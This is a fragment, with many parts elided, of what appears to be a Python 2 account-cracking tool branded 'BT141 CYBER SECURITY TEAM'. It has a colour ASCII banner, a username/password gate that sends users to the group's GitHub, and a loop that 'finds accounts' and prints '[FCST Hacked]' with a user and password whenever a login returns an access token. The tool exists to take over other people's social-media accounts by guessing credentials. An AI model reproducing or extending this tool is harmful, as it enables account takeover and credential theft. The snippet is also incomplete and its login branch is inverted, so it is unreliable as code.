...
\033[0;41;40
\033[0;41;40 ____ _______ __ _  _  __ 
\033[0;41;40 |  _ \__   __/_ | || |/_ |
\033[0;41;40 | |_) | | |   | | || |_| |
\033[0;41;40 |  _ <  | |   | |__   _| |
\033[0;41;40 | |_) | | |   | |  | | | |
\033[0;41;40 |____/  |_|   |_|  |_| |_|
\033[0;41;40 
                       
\033[1;31;40--------------------------------------------------    
|  >>>>>>\033[2;37;40mð°BT141 CYBER SECURITY TEAMð°<<<<<  |
\033[1;31;40--------------------------------------------------
â£ Coded by   : BT141
â£ GitHub     : https://github.com/blacktiger141
â£ Made with  : BT141 CYBER SECURITY TEAM
â£ Pre help   : Awal md Awal
--------------------------------------------------
                                '''
os.system('clear')
print (logo)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            print "\033[1;91mWrong!,\033[1;92mjoin our Github to get the correct password"
            os.system('xdg-open https://github.com/blacktiger141')

    else:
        print "\033[0;37;41mWrong!,\033[0;37;41mjoin our Github to get the correct username"
...
def action():
	...
	time.sleep(0.5)
	psb ('[ð§] Please wait,  BT141 finding accounts ...')
	time.sleep(0.5)
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m[FCST Hacked]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
